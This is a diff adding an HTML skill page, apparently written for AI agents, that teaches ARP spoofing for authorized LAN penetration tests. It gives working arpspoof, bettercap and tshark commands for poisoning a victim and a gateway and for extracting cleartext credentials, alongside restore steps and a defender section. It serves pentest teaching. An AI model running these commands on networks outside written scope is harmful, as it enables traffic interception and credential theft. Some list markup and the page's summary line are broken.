@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: arp-spoofing</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>arp-spoofing</h2><div class="meta"><span class="badge gray">network</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when performing authorized man-in-the-middle testing on a</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="recon-active.html">recon-active</a> <a href="network-pivoting.html">network-pivoting</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>dsniff</td><td>2.4</td></tr><tr><td>Wireshark</td><td>4.4</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a LAN, and it believes whoever answers last. ARP spoofing exploits that trust: you tell the victim you are the gateway and tell the gateway you are the victim, so traffic flows through your machine. This skill covers authorized MITM testing on a local segment: enabling forwarding, running the spoof with arpspoof or bettercap, capturing traffic, finding cleartext credentials, and, critically, restoring ARP tables when you finish. This is lab and explicitly scoped LAN work only; spoofing on networks you do not own or have permission to test is illegal. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the LAN segment and the target and gateway addresses are in the</li>
+<p>written scope.</p>
+<li>Enable IP forwarding so the victim keeps working through you.</li>
+<li>Start the ARP spoof: poison the victim against the gateway and the</li>
+<p>gateway against the victim.</p>
+<li>Verify you are in the middle by watching traffic flow.</li>
+<li>Capture traffic and hunt for cleartext credentials, tokens, and</li>
+<p>interesting protocols.</p>
+<li>Stop the spoof and restore correct ARP entries on both sides.</li>
+<li>Verify the victim and gateway communicate normally again.</li>
+</ol>
+<h2>1. Understand the moving parts</h2>
+<p>On the test LAN you need three addresses: your attack box, the victim, and the gateway (or any second victim for a victim to victim spoof). Learn the MAC addresses first so you can tell poisoned entries from real ones later.</p>
+<pre><code class="language-bash"># Your address and interface
+ip -4 addr show dev eth0 | grep inet
+
+# Victim and gateway MACs before any spoofing (baseline)
+ping -c1 192.168.1.10 &gt;/dev/null &amp;&amp; ip neigh show 192.168.1.10
+ping -c1 192.168.1.1 &gt;/dev/null &amp;&amp; ip neigh show 192.168.1.1
+
+# Save the true gateway MAC for the restore step
+ip neigh show 192.168.1.1 | awk &#x27;{print $5}&#x27; &gt; /tmp/true-gw-mac.txt
+cat /tmp/true-gw-mac.txt</code></pre>
+<h2>2. Enable IP forwarding</h2>
+<p>Without forwarding, the victim loses connectivity the moment you poison them, which is a denial of service, not a MITM. Enable forwarding first, every time.</p>
+<pre><code class="language-bash"># Enable IPv4 forwarding for this session
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Verify it stuck
+cat /proc/sys/net/ipv4/ip_forward
+# Expect: 1
+
+# Make it survive the session if the test runs long (optional)
+echo &quot;net.ipv4.ip_forward=1&quot; | sudo tee /etc/sysctl.d/99-mitm.conf
+sudo sysctl -p /etc/sysctl.d/99-mitm.conf</code></pre>
+<p>On the victim side nothing changes; forwarding is only your box passing packets between victim and gateway like a router.</p>
+<h2>3. Run the ARP spoof</h2>
+<p>The classic tool is <code>arpspoof</code> from dsniff. Run two instances: one poisons the victim (telling it you are the gateway), the other poisons the gateway (telling it you are the victim). Bidirectional poisoning catches traffic both ways.</p>
+<pre><code class="language-bash"># Terminal 1: poison the victim (victim thinks your MAC is the gateway)
+sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+
+# Terminal 2: poison the gateway (gateway thinks your MAC is the victim)
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10</code></pre>
+<p>The <code>-t</code> flag targets one host; without it, arpspoof poisons the whole LAN, which is noisy and usually out of scope. Keep both running for the whole capture.</p>
+<pre><code class="language-bash"># bettercap alternative: one command, cleaner control
+sudo bettercap -iface eth0 -eval &quot;
+  set arp.spoof.targets 192.168.1.10;
+  arp.spoof on;
+  net.sniff on;
+&quot;
+# Stop with: arp.spoof off (bettercap restores ARP tables automatically)</code></pre>
+<p>Verify the poison took effect from the victim&#x27;s point of view. On your box you cannot see the victim&#x27;s ARP table directly, but you can confirm traffic is flowing through you (next section). If you have a shell on the victim (lab), check <code>arp -a</code> there: the gateway IP should show your MAC.</p>
+<h2>4. Capture and inspect traffic</h2>
+<p>Capture on your interface while the spoof runs. Filter aggressively so you find credentials instead of drowning in packets.</p>
+<pre><code class="language-bash"># Capture victim traffic to a file
+sudo tshark -i eth0 -f &quot;host 192.168.1.10&quot; -w /tmp/mitm.pcap &amp;
+TSHARK=$!
+
+# Watch HTTP requests live in another terminal
+sudo tshark -i eth0 -f &quot;host 192.168.1.10&quot; -Y http.request -T fields \
+  -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value \
+  2&gt;/dev/null | head -40</code></pre>
+<pre><code class="language-bash"># After capture: hunt credentials in the pcap
+tshark -r /tmp/mitm.pcap -Y &#x27;http.request.method == POST&#x27; -T fields \
+  -e http.file_data | grep -i -E &#x27;user|pass|token&#x27; | head -20
+
+# FTP, Telnet, and other cleartext protocols
+tshark -r /tmp/mitm.pcap -Y &#x27;ftp.request.command == &quot;PASS&quot; or telnet&#x27; \
+  -T fields -e ftp.request.arg -e telnet.data | head -20
+
+# DNS queries the victim makes (reveals browsing and internal names)
+tshark -r /tmp/mitm.pcap -Y dns.qry.name -T fields -e dns.qry.name \
+  | sort -u | head -40</code></pre>
+<p>High value finds: HTTP logins, FTP/Telnet passwords, SNMP community strings, internal hostnames from DNS, session cookies on non-HTTPS sites, and email credentials on unencrypted POP3/IMAP. Each finding needs the protocol, the redacted evidence, and the timestamp.</p>
+<h2>5. Prove it without damage</h2>
+<p>The report needs proof you were in the middle and what was exposed. Safe proofs: a screenshot of the victim&#x27;s poisoned ARP table, a tshark line showing a cleartext login (redact the password in the report), and a before/after of the ARP restore. Do not modify traffic, inject content, or hijack sessions during a standard MITM test; interception proof is enough.</p>
+<h2>6. Restore the network</h2>
+<p>This step is not optional. When you stop poisoning, both sides keep the wrong MAC until their ARP entries expire, which can blackhole traffic for minutes. Restore actively.</p>
+<pre><code class="language-bash"># Stop arpspoof in both terminals with Ctrl-C, then fix the entries
+# Send correct ARP replies: victim learns the real gateway MAC again
+GW_MAC=$(cat /tmp/true-gw-mac.txt)
+sudo arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 &gt;/dev/null 2&gt;&amp;1 &amp;
+sleep 3; sudo pkill -f &quot;arpspoof.*192.168.1.10&quot;
+
+# bettercap restores automatically on &#x27;arp.spoof off&#x27;; verify anyway
+ping -c2 192.168.1.10 &amp;&amp; ping -c2 192.168.1.1</code></pre>
+<pre><code class="language-bash"># Final verification: victim should reach the internet again
+# (run from the victim in a lab, or ask the client contact to confirm)
+# On your box, confirm forwarding is back to normal use and stop captures
+sudo pkill tshark
+echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward</code></pre>
+<p>If you used bettercap, its <code>arp.spoof off</code> sends corrective ARPs itself; still verify with pings. Never leave a test with poisoned tables behind.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The victim uses a static ARP entry for the gateway. Your spoofed replies</li>
+<p>are ignored; note the control as a positive finding and move on.</p>
+<li>The switch has Dynamic ARP Inspection (DAI). Spoofed ARPs get dropped</li>
+<p>at the port; you will see no traffic and the attack silently fails.</p>
+<li>The victim is on Wi-Fi with client isolation. Clients cannot ARP each</li>
+<p>other at all; MITM from wireless to wireless is impossible here.</p>
+<li>IP forwarding was forgotten. The victim loses connectivity immediately;</li>
+<p>enable forwarding and restart the spoof, and note the brief outage.</p>
+<li>arpspoof says <code>couldn&#x27;t arp for host</code>. The target is down or on a</li>
+<p>different segment; recheck addresses and your interface.</p>
+<li>HTTPS everywhere. You will see hostnames via SNI and DNS but no</li>
+<p>content; that is the expected result on a well configured network, and stripping TLS is out of scope for this skill.</p>
+<li>The gateway is also the DHCP server with short leases. DHCP renewals</li>
+<p>can reset ARP tables mid-test; shorten your capture windows.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>One victim works but you need the whole segment. Only expand targets</li>
+<p>with written approval; each new target is a new line in the scope.</p>
+<li>Cleartext protocols found. Document each with protocol, port, and a</li>
+<p>redacted sample; recommend TLS or VPN for each one specifically.</p>
+<li>You need session hijacking proof. That crosses into active session</li>
+<p>attacks; get explicit approval first, then use bettercap&#x27;s proxy modules rather than hand-rolled injection.</p>
+<li>The network blocks your spoof entirely (DAI, static ARP). Report the</li>
+<p>controls as effective and pivot to other LAN attacks in scope, such as LLMNR poisoning (see llmnr-poisoning).</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see ARP spoofing as duplicate MAC claims: the same IP announced from two MACs, gratuitous ARP storms from one host, and ARP table flapping. Tools like arpwatch, XArp, and NDR sensors alert on exactly this. Wireshark shows it clearly with the filter <code>arp.duplicate-address- detected</code>. The durable fixes: Dynamic ARP Inspection on managed switches, static ARP entries for critical hosts (gateway, servers), 802.1X port authentication so rogue devices cannot join, and encrypting everything so a successful MITM still sees only ciphertext. Segment the LAN so one poisoned broadcast domain cannot reach the crown jewels.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1557 (Adversary-in-the-Middle): ARP spoofing is the</li>
+<p>classic LAN instance.</p>
+<li>CWE-306 (Missing Authentication for Critical Function): ARP trusts</li>
+<p>unauthenticated replies.</p>
+<li>CWE-319 (Cleartext Transmission of Sensitive Information): what the</li>
+<p>MITM position exposes.</p>
+<li>IETF RFC 826 (Address Resolution Protocol).</li>
+<li>dsniff (arpspoof) documentation: https://www.monkey.org/~dugsong/dsniff/</li>
+<li>bettercap documentation: https://www.bettercap.org/</li>
+<li>Wireshark ARP display filters: https://wiki.wireshark.org/ARP</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
